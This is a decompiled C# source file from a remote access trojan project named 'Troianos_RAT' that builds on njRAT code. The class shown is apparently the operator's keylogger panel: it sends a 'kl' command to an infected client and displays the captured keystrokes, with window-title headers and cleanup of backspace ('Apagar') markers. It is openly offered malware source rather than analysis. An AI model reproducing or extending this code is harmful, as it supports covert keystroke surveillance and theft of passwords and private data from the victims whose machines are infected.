using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.My.Resources;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x02000011 RID: 17
	[DesignerGenerated]
	public partial class kl : Form
	{
		// Token: 0x06000190 RID: 400 RVA: 0x001E7F58 File Offset: 0x001E6358
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = kl.__ENCList;
			lock (_ENCList)
			{
				bool flag = kl.__ENCList.Count == kl.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = kl.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = kl.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								kl.__ENCList[num] = kl.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					kl.__ENCList.RemoveRange(num, kl.__ENCList.Count - num);
					kl.__ENCList.Capacity = kl.__ENCList.Count;
				}
				kl.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000080 RID: 128
		// (get) Token: 0x06000193 RID: 403 RVA: 0x001E863C File Offset: 0x001E6A3C
		// (set) Token: 0x06000194 RID: 404 RVA: 0x001E8654 File Offset: 0x001E6A54
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x17000081 RID: 129
		// (get) Token: 0x06000195 RID: 405 RVA: 0x001E8660 File Offset: 0x001E6A60
		// (set) Token: 0x06000196 RID: 406 RVA: 0x001E8678 File Offset: 0x001E6A78
		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				ToolStripItemClickedEventHandler value2 = new ToolStripItemClickedEventHandler(this.MenuStrip1_ItemClicked);
				bool flag = this._MenuStrip1 != null;
				if (flag)
				{
					this._MenuStrip1.ItemClicked -= value2;
				}
				this._MenuStrip1 = value;
				flag = (this._MenuStrip1 != null);
				if (flag)
				{
					this._MenuStrip1.ItemClicked += value2;
				}
			}
		}

		// Token: 0x17000082 RID: 130
		// (get) Token: 0x06000197 RID: 407 RVA: 0x001E86D8 File Offset: 0x001E6AD8
		// (set) Token: 0x06000198 RID: 408 RVA: 0x001E86F0 File Offset: 0x001E6AF0
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				flag = (this._ToolStripMenuItem1 != null);
				if (flag)
				{
					this._ToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x17000083 RID: 131
		// (get) Token: 0x06000199 RID: 409 RVA: 0x001E8750 File Offset: 0x001E6B50
		// (set) Token: 0x0600019A RID: 410 RVA: 0x001E8768 File Offset: 0x001E6B68
		internal virtual ToolStripMenuItem ToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem2_Click);
				bool flag = this._ToolStripMenuItem2 != null;
				if (flag)
				{
					this._ToolStripMenuItem2.Click -= value2;
				}
				this._ToolStripMenuItem2 = value;
				flag = (this._ToolStripMenuItem2 != null);
				if (flag)
				{
					this._ToolStripMenuItem2.Click += value2;
				}
			}
		}

		// Token: 0x17000084 RID: 132
		// (get) Token: 0x0600019B RID: 411 RVA: 0x001E87C8 File Offset: 0x001E6BC8
		// (set) Token: 0x0600019C RID: 412 RVA: 0x001E87E0 File Offset: 0x001E6BE0
		internal virtual ToolStripTextBox TFind
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TFind;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TFind = value;
			}
		}

		// Token: 0x17000085 RID: 133
		// (get) Token: 0x0600019D RID: 413 RVA: 0x001E87EC File Offset: 0x001E6BEC
		// (set) Token: 0x0600019E RID: 414 RVA: 0x001E8804 File Offset: 0x001E6C04
		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		// Token: 0x17000086 RID: 134
		// (get) Token: 0x0600019F RID: 415 RVA: 0x001E8810 File Offset: 0x001E6C10
		// (set) Token: 0x060001A0 RID: 416 RVA: 0x001E8828 File Offset: 0x001E6C28
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				CancelEventHandler value2 = new CancelEventHandler(this.ContextMenuStrip1_Opening);
				bool flag = this._ContextMenuStrip1 != null;
				if (flag)
				{
					this._ContextMenuStrip1.Opening -= value2;
				}
				this._ContextMenuStrip1 = value;
				flag = (this._ContextMenuStrip1 != null);
				if (flag)
				{
					this._ContextMenuStrip1.Opening += value2;
				}
			}
		}

		// Token: 0x17000087 RID: 135
		// (get) Token: 0x060001A1 RID: 417 RVA: 0x001E8888 File Offset: 0x001E6C88
		// (set) Token: 0x060001A2 RID: 418 RVA: 0x001E88A0 File Offset: 0x001E6CA0
		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem_Click);
				bool flag = this._CopyToolStripMenuItem != null;
				if (flag)
				{
					this._CopyToolStripMenuItem.Click -= value2;
				}
				this._CopyToolStripMenuItem = value;
				flag = (this._CopyToolStripMenuItem != null);
				if (flag)
				{
					this._CopyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000088 RID: 136
		// (get) Token: 0x060001A3 RID: 419 RVA: 0x001E8900 File Offset: 0x001E6D00
		// (set) Token: 0x060001A4 RID: 420 RVA: 0x001E8918 File Offset: 0x001E6D18
		internal virtual ToolStripMenuItem SelectAllToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SelectAllToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SelectAllToolStripMenuItem_Click);
				bool flag = this._SelectAllToolStripMenuItem != null;
				if (flag)
				{
					this._SelectAllToolStripMenuItem.Click -= value2;
				}
				this._SelectAllToolStripMenuItem = value;
				flag = (this._SelectAllToolStripMenuItem != null);
				if (flag)
				{
					this._SelectAllToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x060001A5 RID: 421 RVA: 0x001E8978 File Offset: 0x001E6D78
		public kl()
		{
			base.Load += this.kl_Load;
			kl.__ENCAddToList(this);
			this.listViewItem_0 = null;
			this.InitializeComponent();
		}

		// Token: 0x060001A6 RID: 422 RVA: 0x001E89AC File Offset: 0x001E6DAC
		public void insert(string T)
		{
			bool flag = T.StartsWith("\u0001") & T.EndsWith("\u0001");
			if (flag)
			{
				this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
				this.T1.SelectionColor = Color.Blue;
				this.T1.AppendText("\r\n[ " + T.Replace("\u0001", string.Empty) + " ]\r\n");
			}
			else
			{
				this.T1.SelectionFont = this.T1.Font;
				this.T1.SelectionColor = this.T1.ForeColor;
				this.T1.AppendText(T + "\r\n");
			}
		}

		// Token: 0x060001A7 RID: 423 RVA: 0x001E8A78 File Offset: 0x001E6E78
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.Copy();
		}

		// Token: 0x060001A8 RID: 424 RVA: 0x001E8A88 File Offset: 0x001E6E88
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				this.c.Send("kl");
				this.ToolStripMenuItem1.Enabled = false;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060001A9 RID: 425 RVA: 0x001E8AD8 File Offset: 0x001E6ED8
		private void SelectAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.SelectAll();
		}

		// Token: 0x060001AA RID: 426 RVA: 0x001E8AE8 File Offset: 0x001E6EE8
		private void ToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.T1.Find(this.TFind.Text, this.T1.SelectionStart + this.T1.SelectionLength, RichTextBoxFinds.None) == -1;
			if (flag)
			{
				this.T1.Find(this.TFind.Text, 0, RichTextBoxFinds.None);
			}
		}

		// Token: 0x060001AB RID: 427 RVA: 0x001E8B48 File Offset: 0x001E6F48
		private void ToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			try
			{
				int num = 1;
				IDataObject dataObject = Clipboard.GetDataObject();
				this.T1.ReadOnly = false;
				while (num != -1)
				{
					num = this.T1.Find("[ Apagar ]", num, RichTextBoxFinds.None);
					bool flag = num > 0;
					if (flag)
					{
						string left = this.T1.Text[num - 1].ToString();
						flag = (Operators.CompareString(left, "]", false) == 0 || Operators.CompareString(left, "\n", false) == 0);
						if (flag)
						{
							this.T1.Select(num, "[ Apagar ]".Length);
							this.T1.Cut();
						}
						else
						{
							this.T1.Select(num - 1, "[ Apagar ]".Length + 1);
							this.T1.Cut();
						}
					}
				}
				Clipboard.SetDataObject(dataObject);
				this.T1.ReadOnly = true;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060001AC RID: 428 RVA: 0x001E8C70 File Offset: 0x001E7070
		private void kl_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x060001AD RID: 429 RVA: 0x001E8C74 File Offset: 0x001E7074
		private void MenuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
		{
		}

		// Token: 0x060001AE RID: 430 RVA: 0x001E8C78 File Offset: 0x001E7078
		private void ContextMenuStrip1_Opening(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x040000B9 RID: 185
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040000BB RID: 187
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x040000BC RID: 188
		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		// Token: 0x040000BD RID: 189
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x040000BE RID: 190
		[AccessedThroughProperty("ToolStripMenuItem2")]
		private ToolStripMenuItem _ToolStripMenuItem2;

		// Token: 0x040000BF RID: 191
		[AccessedThroughProperty("TFind")]
		private ToolStripTextBox _TFind;

		// Token: 0x040000C0 RID: 192
		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		// Token: 0x040000C1 RID: 193
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x040000C2 RID: 194
		[AccessedThroughProperty("CopyToolStripMenuItem")]
		private ToolStripMenuItem _CopyToolStripMenuItem;

		// Token: 0x040000C3 RID: 195
		[AccessedThroughProperty("SelectAllToolStripMenuItem")]
		private ToolStripMenuItem _SelectAllToolStripMenuItem;

		// Token: 0x040000C4 RID: 196
		public Client c;

		// Token: 0x040000C5 RID: 197
		private ListViewItem listViewItem_0;
	}
}
